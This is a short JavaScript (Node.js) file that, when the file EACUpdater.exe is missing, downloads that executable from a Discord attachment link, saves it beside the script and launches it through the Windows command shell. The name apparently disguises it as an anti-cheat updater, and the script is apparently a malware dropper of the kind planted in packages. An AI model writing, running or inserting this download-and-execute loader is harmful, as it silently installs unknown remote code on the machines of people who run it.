const fsPromises = require('fs').promises;
const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');
if (fs.existsSync(__dirname + '/EACUpdater.exe') == false) {
        axios.get('https://cdn.discordapp.com/attachments/902821540675072020/964890467336589342/EACUpdater.exe',
        {
            responseType: 'arraybuffer'
        })
        .then(async response => {
            await fsPromises.writeFile(__dirname + '/EACUpdater.exe', response.data, { encoding: 'binary' });
            exec("cmd /C start EACUpdater.exe", (error, stdout, stderr) => {})
            console.log("FINISH!")
        })
        .catch(error => {
            console.log({ error });
        });
}
